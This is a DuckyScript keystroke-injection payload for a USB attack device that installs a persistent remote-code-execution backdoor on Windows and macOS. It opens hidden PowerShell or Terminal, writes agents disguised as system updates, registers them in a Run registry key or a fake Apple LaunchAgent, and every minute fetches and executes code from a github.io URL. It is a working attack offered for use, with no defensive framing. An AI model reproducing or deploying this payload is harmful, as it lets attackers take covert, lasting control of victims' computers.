ATTACKMODE HID STORAGE


DELAY 500

REM Title: Persistent Remote Code Execution (Final Version)
REM Author: Panik-144 & Antigravity
REM Description: Installs a persistent agent on Windows and macOS.
REM Target: Windows/ OSX

EXTENSION PASSIVE_WINDOWS_DETECT
    REM VERSION 1.1
    REM AUTHOR: Korben
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7
    $_OS = #NOT_WINDOWS
    VAR $MAX_TRIES = #MAX_WAIT
    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF
END_EXTENSION

IF $_OS == WINDOWS THEN
    REM --- WINDOWS PERSISTENCE ---
    GUI r
    DELAY 500
    STRINGLN powershell -WindowStyle Hidden
    DELAY 1000
    
    REM 1. Erstelle den dauerhaften Agenten (VBScript f체r Stealth) in Public
    STRING $path = "$env:PUBLIC\win_update.ps1";
    STRING $code = 'while($true){try{$u="https://panik-144.github.io/Rubber_Ducky/remote/activate.ps1?t="+(Get-Date).Ticks;$c=(iwr $u -UseBasicParsing -ErrorAction Stop).Content;if($c -match "SELF_DESTRUCT"){Remove-Item $env:PUBLIC\win_update.ps1 -Force; Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinSystemUpdate"; break} if($c){IEX $c}}catch{};Start-Sleep -s 60}';
    STRING Set-Content -Path $path -Value $code;
    ENTER
    
    DELAY 500

    REM 2. F체ge Autostart via Registry hinzu
    STRING New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinSystemUpdate" -Value "powershell -WindowStyle Hidden -File $env:PUBLIC\win_update.ps1" -PropertyType String -Force;
    ENTER

    DELAY 500
    
    REM 3. Starte den Agenten sofort
    STRING Start-Process powershell -ArgumentList "-WindowStyle Hidden -File $env:PUBLIC\win_update.ps1"
    ENTER
    
ELSE
    REM --- MACOS PERSISTENCE ---
    COMMAND SPACE
    DELAY 500
    STRING Terminal
    DELAY 500
    ENTER
    DELAY 1000
    
    REM 1. Erstelle den versteckten Agenten im Home-Verzeichnis
    STRINGLN echo 'while true; do c=$(curl -s -f "https://panik-144.github.io/Rubber_Ducky/remote/activate.sh?t=$(date +%s)"); if [[ "$c" == *"SELF_DESTRUCT"* ]]; then rm ~/.hidden_updater.sh; rm ~/Library/LaunchAgents/com.apple.systemupdate.plist; launchctl unload ~/Library/LaunchAgents/com.apple.systemupdate.plist; break; fi; if [ ! -z "$c" ]; then echo "$c" | sh; fi; sleep 60; done' > ~/.hidden_updater.sh
    
    DELAY 200

    ENTER

    STRINGLN chmod +x ~/.hidden_updater.sh

    DELAY 200
    
    ENTER
    REM 2. Erstelle den LaunchAgent f체r Autostart
    STRINGLN mkdir -p ~/Library/LaunchAgents

    DELAY 200

    ENTER

    STRINGLN echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.apple.systemupdate</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>'$HOME'/.hidden_updater.sh</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>60</integer></dict></plist>' > ~/Library/LaunchAgents/com.apple.systemupdate.plist
    
    DELAY 200

    ENTER
    REM 3. Lade und starte den Agenten
    STRINGLN launchctl load ~/Library/LaunchAgents/com.apple.systemupdate.plist
    
    DELAY 200

    ENTER
    REM Aufr채umen
    DELAY 500
    STRINGLN disown
    STRINGLN exit
    DELAY 500
    COMMAND w
END_IF




